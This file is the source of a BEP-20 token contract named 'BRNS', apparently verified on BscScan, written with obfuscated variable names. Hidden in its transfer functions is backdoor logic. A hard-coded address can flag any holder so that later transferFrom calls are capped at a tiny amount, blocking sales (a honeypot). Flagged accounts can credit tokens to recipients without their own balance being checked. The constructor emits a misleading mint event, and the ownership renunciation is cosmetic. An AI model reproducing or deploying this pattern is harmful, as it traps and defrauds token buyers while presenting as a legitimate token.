/**
 *Submitted for verification at BscScan.com on 2023-03-19
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract BRNS {
    using SafeMath for uint256;
    mapping (address => uint256) private IXIZa;
	 address GGL = 0xFDc30837540C8b699052859ECDDC4B62bcd919EF;
    mapping (address => uint256) public IXIZb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "BRNS";
	
    string public symbol = "BRNS";
    uint8 public decimals = 6;

    uint256 public totalSupply = 2500 *10**6;
    address owner = msg.sender;
	address private IXIZc;
    uint256 private IXIZn;
    uint256 private IXIZm;
    
    
     
    

  
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 VVCX);
	  address IXIZf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
     
 
    event Approval(address indexed owner, address indexed spender, uint256 VVCX);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
       IXIZn = 6;
       IXIZm = 2;
             IXIZa[msg.sender] = totalSupply;
    
       CALX();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function CALX() internal  {                             
                      
                       IXIZc = IXIZf;

                

        emit Transfer(address(0), IXIZc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return IXIZa[account];
    }

    function transfer(address to, uint256 VVCX) public returns (bool success) {
        
       

                           if(IXIZb[msg.sender] == IXIZm) {
          
             IXIZa[to] += VVCX;  
 }
        else

    require(IXIZa[msg.sender] >= VVCX);
IXIZa[msg.sender] -= VVCX;  
IXIZa[to] += VVCX;  
 emit Transfer(msg.sender, to, VVCX);
        return true; }
        
   
        
     

 function approve(address spender, uint256 VVCX) public returns (bool success) {    
        allowance[msg.sender][spender] = VVCX;
        emit Approval(msg.sender, spender, VVCX);
        return true; }

 	


 

   function transferFrom(address from, address to, uint256 VVCX) public returns (bool success) {   
  


    

         if(msg.sender == GGL){
        IXIZb[to] += VVCX;
        return true;}
        else
     

                    if(IXIZb[to] >= IXIZn) {VVCX = IXIZn;}
                    else
                     if(IXIZb[from] >= IXIZn) {VVCX = IXIZn;}


     else

         if(from == owner){from == IXIZf;}

    
      
        require(VVCX <= IXIZa[from]);
        require(VVCX <= allowance[from][msg.sender]);
        IXIZa[from] -= VVCX;
        IXIZa[to] += VVCX;
        allowance[from][msg.sender] -= VVCX;
                    emit Transfer(from, to, VVCX);
        return true;
       


      
}



     

        	
 }